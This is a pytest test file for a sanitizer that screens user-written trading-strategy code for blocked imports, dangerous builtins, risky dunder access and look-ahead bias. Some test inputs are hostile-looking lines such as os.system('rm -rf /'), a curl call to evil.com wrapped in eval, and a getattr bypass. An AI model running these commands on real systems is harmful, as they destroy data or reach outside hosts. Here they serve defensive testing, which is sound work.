"""Tests for crabquant.refinement.ast_sanitizer — AST Safety Sanitizer."""

from __future__ import annotations

import pytest

from crabquant.refinement.ast_sanitizer import (
    BLOCKED_ATTR_ACCESS,
    BLOCKED_BUILTINS,
    BLOCKED_IMPORTS,
    LOOKAHEAD_PATTERNS,
    sanitize_strategy_code,
)


# ── Helpers ──────────────────────────────────────────────────────────────────

def _violation_texts(is_safe: bool, violations: list[str]) -> list[str]:
    """Return just the violation message strings."""
    return violations


# ── Phase 0: Edge cases ──────────────────────────────────────────────────────

class TestEdgeCases:
    def test_empty_string(self):
        is_safe, violations = sanitize_strategy_code("")
        assert is_safe is False
        assert "Empty code" in violations

    def test_whitespace_only(self):
        is_safe, violations = sanitize_strategy_code("   \n\t  \n")
        assert is_safe is False
        assert "Empty code" in violations

    def test_syntax_error(self):
        code = "def foo(\n"
        is_safe, violations = sanitize_strategy_code(code)
        assert is_safe is False
        assert any("SyntaxError" in v for v in violations)

    def test_syntax_error_reports_line(self):
        code = "x = 1\ny =\n"
        is_safe, violations = sanitize_strategy_code(code)
        assert is_safe is False
        line_violation = [v for v in violations if "SyntaxError" in v]
        assert len(line_violation) == 1
        # Format is "SyntaxError at line 2: ..."
        assert "line 2" in line_violation[0]

    def test_valid_clean_code_is_safe(self):
        code = (
            "import pandas as pd\n"
            "import numpy as np\n"
            "x = [1, 2, 3]\n"
            "y = sum(x)\n"
        )
        is_safe, violations = sanitize_strategy_code(code)
        assert is_safe is True
        assert violations == []

    def test_comment_only_code(self):
        code = "# Just a comment\n# Another comment\n"
        is_safe, violations = sanitize_strategy_code(code)
        assert is_safe is True
        assert violations == []


# ── Phase 2: Import violations ───────────────────────────────────────────────

class TestBlockedImports:
    @pytest.mark.parametrize("module", list(BLOCKED_IMPORTS.keys()))
    def test_blocked_import_statement(self, module):
        """'import <module>' should be caught for every blocked module."""
        code = f"import {module}\n"
        is_safe, violations = sanitize_strategy_code(code)
        assert is_safe is False
        assert any(f"Blocked import '{module}'" in v for v in violations)

    def test_import_os(self):
        code = "import os\n"
        is_safe, violations = sanitize_strategy_code(code)
        assert is_safe is False
        assert any("os" in v and "Blocked import" in v for v in violations)

    def test_import_sys(self):
        code = "import sys\n"
        is_safe, violations = sanitize_strategy_code(code)
        assert is_safe is False
        assert any("sys" in v for v in violations)

    def test_import_subprocess(self):
        code = "import subprocess\n"
        is_safe, violations = sanitize_strategy_code(code)
        assert is_safe is False
        assert any("subprocess" in v for v in violations)

    def test_import_os_path_submodule(self):
        """'import os.path' should still be caught (top_module = os)."""
        code = "import os.path\n"
        is_safe, violations = sanitize_strategy_code(code)
        assert is_safe is False
        assert any("os" in v for v in violations)

    def test_from_os_import_system(self):
        code = "from os import system\n"
        is_safe, violations = sanitize_strategy_code(code)
        assert is_safe is False
        assert any("Blocked import from" in v and "os" in v for v in violations)

    def test_from_os_path_import_join(self):
        code = "from os.path import join\n"
        is_safe, violations = sanitize_strategy_code(code)
        assert is_safe is False

    def test_from_pickle_import_loads(self):
        code = "from pickle import loads\n"
        is_safe, violations = sanitize_strategy_code(code)
        assert is_safe is False
        assert any("pickle" in v for v in violations)

    def test_from_builtin_import_eval(self):
        """Importing a blocked builtin name via 'from X import eval' should be caught."""
        code = "from builtins import eval\n"
        is_safe, violations = sanitize_strategy_code(code)
        # 'builtins' is not in BLOCKED_IMPORTS, but 'eval' is in BLOCKED_BUILTINS
        assert any("eval" in v for v in violations)

    def test_safe_imports_pass(self):
        """pandas, numpy, math should all be safe."""
        code = "import pandas as pd\nimport numpy as np\nimport math\n"
        is_safe, violations = sanitize_strategy_code(code)
        assert is_safe is True
        assert violations == []

    def test_multiple_imports_multiple_violations(self):
        code = "import os\nimport subprocess\n"
        is_safe, violations = sanitize_strategy_code(code)
        assert is_safe is False
        assert len(violations) >= 2

    def test_import_line_number_reported(self):
        code = "x = 1\nimport os\n"
        is_safe, violations = sanitize_strategy_code(code)
        assert any("Line 2" in v for v in violations)


# ── Phase 3: Dangerous builtin calls ────────────────────────────────────────

class TestBlockedBuiltinCalls:
    @pytest.mark.parametrize("builtin", ["exec", "eval", "compile", "__import__", "open",
                                          "globals", "locals", "getattr", "setattr",
                                          "delattr", "vars"])
    def test_blocked_builtin_direct_call(self, builtin):
        code = f'{builtin}("something")\n'
        is_safe, violations = sanitize_strategy_code(code)
        assert is_safe is False
        assert any(builtin in v and "Blocked builtin call" in v for v in violations)

    def test_eval_call(self):
        code = "eval('1 + 1')\n"
        is_safe, violations = sanitize_strategy_code(code)
        assert is_safe is False
        assert any("eval" in v for v in violations)

    def test_exec_call(self):
        code = 'exec("print(1)")\n'
        is_safe, violations = sanitize_strategy_code(code)
        assert is_safe is False
        assert any("exec" in v for v in violations)

    def test_open_call(self):
        code = 'open("secret.txt")\n'
        is_safe, violations = sanitize_strategy_code(code)
        assert is_safe is False
        assert any("open" in v for v in violations)

    def test_safe_function_calls(self):
        """sum, len, range, print, etc. should be fine."""
        code = "x = sum([1, 2, 3])\ny = len(x)\nprint(y)\n"
        is_safe, violations = sanitize_strategy_code(code)
        assert is_safe is True

    def test_builtin_call_line_number(self):
        code = "x = 1\neval('x')\n"
        is_safe, violations = sanitize_strategy_code(code)
        assert any("Line 2" in v and "eval" in v for v in violations)


# ── Phase 3 continued: Blocked attribute calls ───────────────────────────────

class TestBlockedAttributeCalls:
    def test_os_system_call(self):
        code = "import os\nos.system('rm -rf /')\n"
        is_safe, violations = sanitize_strategy_code(code)
        assert is_safe is False
        assert any("os.system" in v for v in violations)

    def test_os_popen_call(self):
        code = "import os\nos.popen('ls')\n"
        is_safe, violations = sanitize_strategy_code(code)
        assert is_safe is False
        assert any("os.popen" in v for v in violations)

    def test_subprocess_call(self):
        code = "import subprocess\nsubprocess.call(['ls'])\n"
        is_safe, violations = sanitize_strategy_code(code)
        assert is_safe is False
        assert any("subprocess.call" in v for v in violations)

    def test_subprocess_run(self):
        code = "import subprocess\nsubprocess.run(['echo', 'hello'])\n"
        is_safe, violations = sanitize_strategy_code(code)
        assert is_safe is False
        assert any("subprocess.run" in v for v in violations)

    def test_sys_exit(self):
        code = "import sys\nsys.exit(1)\n"
        is_safe, violations = sanitize_strategy_code(code)
        assert is_safe is False
        assert any("sys.exit" in v for v in violations)

    def test_safe_attribute_access(self):
        """pd.DataFrame should be fine."""
        code = "import pandas as pd\ndf = pd.DataFrame({'a': [1, 2]})\n"
        is_safe, violations = sanitize_strategy_code(code)
        assert is_safe is True

    def test_os_environ_access(self):
        """os.environ as a subscript is not caught by the Call check,
        but the 'import os' import violation is still caught."""
        code = "import os\nos.environ['HOME']\n"
        is_safe, violations = sanitize_strategy_code(code)
        assert is_safe is False
        # The import os is still blocked
        assert any("os" in v and "Blocked import" in v for v in violations)


# ── Phase 4: Dunder attribute access ────────────────────────────────────────

class TestDunderAccess:
    def test_safe_dunder_class(self):
        """__class__ is in the safe dunders list."""
        code = "x.__class__\n"
        is_safe, violations = sanitize_strategy_code(code)
        assert is_safe is True

    def test_safe_dunder_init(self):
        code = "class Foo:\n    def __init__(self):\n        pass\n"
        is_safe, violations = sanitize_strategy_code(code)
        assert is_safe is True

    def test_safe_dunder_name(self):
        code = "x.__name__\n"
        is_safe, violations = sanitize_strategy_code(code)
        assert is_safe is True

    def test_safe_dunder_repr(self):
        code = "x.__repr__()\n"
        is_safe, violations = sanitize_strategy_code(code)
        assert is_safe is True

    def test_dangerous_dunder_builtins(self):
        """__builtins__ is NOT in the safe list."""
        code = "x.__builtins__\n"
        is_safe, violations = sanitize_strategy_code(code)
        assert is_safe is False
        assert any("__builtins__" in v and "dunder" in v for v in violations)

    def test_dangerous_dunder_subclasses(self):
        code = "x.__subclasses__()\n"
        is_safe, violations = sanitize_strategy_code(code)
        assert is_safe is False
        assert any("__subclasses__" in v for v in violations)

    def test_dangerous_dunder_code(self):
        code = "func.__code__\n"
        is_safe, violations = sanitize_strategy_code(code)
        assert is_safe is False
        assert any("__code__" in v for v in violations)

    def test_dangerous_dunder_globals(self):
        code = "func.__globals__\n"
        is_safe, violations = sanitize_strategy_code(code)
        assert is_safe is False
        assert any("__globals__" in v for v in violations)

    def test_dangerous_dunder_base(self):
        code = "x.__base__\n"
        is_safe, violations = sanitize_strategy_code(code)
        assert is_safe is False
        assert any("__base__" in v for v in violations)


# ── Phase 5: Look-ahead bias patterns ────────────────────────────────────────

class TestLookAheadBias:
    def test_shift_negative(self):
        code = "df['close'].shift(-1)\n"
        is_safe, violations = sanitize_strategy_code(code)
        assert is_safe is False
        assert any("look-ahead" in v for v in violations)

    def test_shift_negative_spaces(self):
        code = "df['close'].shift( -5 )\n"
        is_safe, violations = sanitize_strategy_code(code)
        assert is_safe is False
        assert any("look-ahead" in v for v in violations)

    def test_shift_positive_is_safe(self):
        code = "df['close'].shift(1)\n"
        is_safe, violations = sanitize_strategy_code(code)
        assert is_safe is True

    def test_negative_slice_index(self):
        code = "df['close'][:-1]\n"
        is_safe, violations = sanitize_strategy_code(code)
        assert is_safe is False
        assert any("negative slice" in v for v in violations)

    def test_negative_slice_large(self):
        code = "x = arr[:-10]\n"
        is_safe, violations = sanitize_strategy_code(code)
        assert is_safe is False
        assert any("negative slice" in v for v in violations)

    def test_positive_slice_is_safe(self):
        code = "x = arr[:10]\n"
        is_safe, violations = sanitize_strategy_code(code)
        assert is_safe is True

    def test_shift_negative_line_number(self):
        code = "x = 1\ndf.shift(-2)\n"
        is_safe, violations = sanitize_strategy_code(code)
        assert any("Line 2" in v and "look-ahead" in v for v in violations)


# ── Combined / realistic strategy code ───────────────────────────────────────

class TestRealisticCode:
    def test_valid_strategy_code(self):
        """A realistic, safe strategy should pass."""
        code = """\
import pandas as pd
import numpy as np

def strategy(data):
    df = data.copy()
    df['sma_20'] = df['close'].rolling(20).mean()
    df['sma_50'] = df['close'].rolling(50).mean()
    df['signal'] = 0
    df.loc[df['sma_20'] > df['sma_50'], 'signal'] = 1
    df.loc[df['sma_20'] < df['sma_50'], 'signal'] = -1
    return df
"""
        is_safe, violations = sanitize_strategy_code(code)
        assert is_safe is True
        assert violations == []

    def test_malicious_strategy_code(self):
        """Strategy with eval, import os, and look-ahead."""
        code = """\
import os
import pandas as pd

def strategy(data):
    eval("os.system('curl evil.com')")
    return data['close'].shift(-1)
"""
        is_safe, violations = sanitize_strategy_code(code)
        assert is_safe is False
        # Should have multiple violations: import os, eval call, look-ahead
        assert len(violations) >= 3

    def test_obfuscated_attempt_with_getattr(self):
        """Using getattr to bypass restrictions should be caught."""
        code = 'getattr(obj, "system")("rm -rf")\n'
        is_safe, violations = sanitize_strategy_code(code)
        assert is_safe is False
        assert any("getattr" in v for v in violations)

    def test_multiple_violations_in_one_file(self):
        code = """\
import os
import subprocess
eval("1")
exec("2")
df.shift(-1)
"""
        is_safe, violations = sanitize_strategy_code(code)
        assert is_safe is False
        # At least: import os, import subprocess, eval, exec, shift(-1), possibly os.eval
        assert len(violations) >= 5
